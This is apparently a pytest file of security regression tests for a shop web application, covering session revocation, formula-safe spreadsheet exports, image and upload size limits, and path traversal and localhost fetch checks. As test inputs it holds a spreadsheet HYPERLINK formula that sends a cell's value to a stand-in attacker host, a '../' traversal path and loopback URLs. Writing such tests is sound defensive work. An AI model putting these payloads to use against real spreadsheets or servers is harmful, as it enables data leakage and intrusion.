"""Security fixes: sessions end with a password change, no formulas in exported spreadsheets,
no oversized pictures or files, no reading outside the photo folders."""

import io

import pytest
from openpyxl import Workbook, load_workbook
from PIL import Image

from app.models import UserRole
from app.schemas.auth import ChangePasswordIn, LoginIn
from app.services import creatives, sheets, throttle
from app.services.images import MAX_PIXELS, NotAnImage, open_image
from tests.conftest import PASSWORD, login, make_user


def test_a_password_change_ends_the_access_tokens_too(client, db):
    make_user(db, "buyer@example.com")
    stolen = login(client, "buyer@example.com")
    assert client.get("/api/me", headers=stolen).status_code == 200
    mine = login(client, "buyer@example.com")
    r = client.post(
        "/api/me/change-password",
        json={"current_password": PASSWORD, "new_password": "password456"},
        headers=mine,
    )
    assert r.status_code == 200, r.text
    # Before, the stolen access token stayed good until it expired (30 minutes).
    assert client.get("/api/me", headers=stolen).status_code == 401


def test_passwords_never_show_in_a_printed_model():
    """Error reports print the request models; the password must not be in them."""
    assert "Sup3rSecret" not in repr(LoginIn(email="a@b.kz", password="Sup3rSecret"))
    assert "Sup3rSecret" not in repr(
        ChangePasswordIn(current_password="Sup3rSecret", new_password="Sup3rSecret2")
    )


def test_formula_looking_cells_stay_text():
    wb = Workbook()
    wb.active.append(['=HYPERLINK("https://evil.example/?"&B1,"Подтвердить")', "Анна"])
    book = load_workbook(io.BytesIO(sheets.to_bytes(wb)))
    cell = book.active["A1"]
    assert cell.data_type == "s"
    assert cell.value.startswith("=HYPERLINK")


def test_a_guests_name_is_text_in_the_delivery_note(client, auth, catalog):
    from tests.test_orders import CHECKOUT

    body = {
        **CHECKOUT,
        "contact_name": '=HYPERLINK("https://evil.example","Подтвердить")',
        "items": [{"variant_id": catalog["coco50"].id, "quantity": 1}],
    }
    order = client.post("/api/orders", json=body).json()
    r = client.get(f"/api/admin/orders/{order['id']}/invoice.xlsx", headers=auth(UserRole.admin))
    assert r.status_code == 200, r.text
    ws = load_workbook(io.BytesIO(r.content)).active
    cells = [c for row in ws.iter_rows() for c in row if c.value and "HYPERLINK" in str(c.value)]
    assert cells and all(c.data_type == "s" for c in cells)


def _png(width: int, height: int) -> bytes:
    buf = io.BytesIO()
    Image.new("L", (width, height)).save(buf, "PNG")
    return buf.getvalue()


def test_a_picture_too_big_to_decode_is_refused():
    side = int(MAX_PIXELS**0.5) + 100
    with pytest.raises(NotAnImage, match="слишком большое"):
        open_image(_png(side, side))


def test_a_big_phone_photo_is_decoded_small():
    buf = io.BytesIO()
    Image.new("RGB", (8000, 6000), (200, 180, 160)).save(buf, "JPEG", quality=60)
    im = open_image(buf.getvalue())
    assert max(im.size) <= 4000  # 1/2 or less of 8000: never the full 48 MP


def test_a_spreadsheet_over_the_limit_is_refused_not_cut(client, auth, monkeypatch):
    from app.routers.admin import system

    monkeypatch.setattr(system, "SPREADSHEET_LIMIT", 100)
    files = {"file": ("big.csv", b"x" * 101, "text/csv")}
    r = client.post("/api/admin/import/catalog", files=files, headers=auth(UserRole.admin))
    assert r.status_code == 413


def test_banner_photos_stay_inside_their_folders(tmp_path, monkeypatch):
    from app.config import get_settings

    media = tmp_path / "media"
    media.mkdir()
    (tmp_path / "secret.txt").write_text("db password")
    monkeypatch.setattr(get_settings(), "media_dir", media)
    assert creatives._photo_bytes("/media/../secret.txt") is None
    # And never the server's own or the local network's addresses.
    assert creatives._photo_bytes("https://127.0.0.1/x.jpg") is None
    assert creatives._photo_bytes("https://localhost/x.jpg") is None
    assert creatives._photo_bytes("http://example.com/x.jpg") is None


def test_the_login_counter_stays_bounded(monkeypatch):
    monkeypatch.setattr(throttle, "MAX_KEYS", 100)
    t = throttle.Throttle(limit=10, window=900)
    for i in range(1000):
        t.hit(f"user{i}@example.com")
    assert len(t._hits) <= 100
